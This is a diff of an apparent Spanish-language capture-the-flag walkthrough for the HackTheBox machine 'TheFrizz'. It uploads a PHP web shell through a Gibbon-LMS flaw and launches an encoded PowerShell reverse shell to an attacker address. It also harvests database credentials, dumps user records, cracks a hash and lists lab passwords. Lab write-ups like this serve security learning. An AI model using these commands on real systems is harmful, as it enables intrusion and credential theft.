@@ -1,6 +1,6 @@
 ---
 title: TheFrizz
-draft: false
+draft: true
 tags:
 ---
 Machine: https://app.hackthebox.com/competitive/7/overview
@@ -73,3 +73,80 @@ python3 CVE-2023-34598.py scan http://frizzdc.frizz.htb/Gibbon-LMS/
 >[!example]- Result
 >![[Pasted image 20250319154112.png]]
 
+
+
+
+
+
+
+
+----
+subir la revershell
+```bash
+curl -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" \
+-H "Host: frizzdc.frizz.htb" \
+--data-urlencode "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K" \
+--data-urlencode "path=shell.php" \
+--data-urlencode "gibbonPersonID=0000000001"
+```
+
+mandar revershell
+![[Pasted image 20250319173607.png]]
+`http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D`
+
+
+
+configuracion 
+![[Pasted image 20250319173729.png]]
+
+```
+$databaseServer = 'localhost';
+$databaseUsername = 'MrGibbonsDB';
+$databasePassword = 'MisterGibbs!Parrot!?1';
+$databaseName = 'gibbon';
+```
+
+Leer base de datos
+```shell
+.\mysql.exe -h localhost -u MrGibbonsDB "-pMisterGibbs!Parrot!?1" -Bse "show databases;use gibbon;show tables;show columns from gibbonPerson;SELECT * FROM gibbonPerson;"
+```
+
+`f.frizzle@frizz.htb:f.frizzle:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489`
+![[Pasted image 20250319180619.png]]
+
+crack
+`067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489`
+```bash
+hashcat -m 1420 f.frizzleHash /usr/share/wordlists/rockyou.txt
+```
+![[Pasted image 20250319181501.png]]
+`Jenni_Luvs_Magic23`
+
+Ahora por [[evil-winrm]] pero no va
+```
+evil-winrm -i 10.10.11.60 -u 'f.frizzle' -p 'Jenni_Luvs_Magic23'
+```
+
+- metodo 1 con el CVE `https://www.exploit-db.com/exploits/51903`
+```bash
+python3 exploit.py 10.10.11.60 80/Gibbon-LMS/ f.frizzle@frizz.htb Jenni_Luvs_Magic23 'whoami'
+```
+![[Pasted image 20250319182500.png]]
+
+- con el [[impacket-getTGT]]
+```bash
+sudo ntpdate -s 10.10.11.60
+impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23
+export KRB5CCNAME=f.frizzle.ccache
+```
+
+ahora cone ste usuario podemos que en la papelera de reciclaje hay cosas
+\
+
+
+
+
+```
+f.frizzle:Jenni_Luvs_Magic23
+m.schoolbus:!suBcig@MehTed!R 
+```
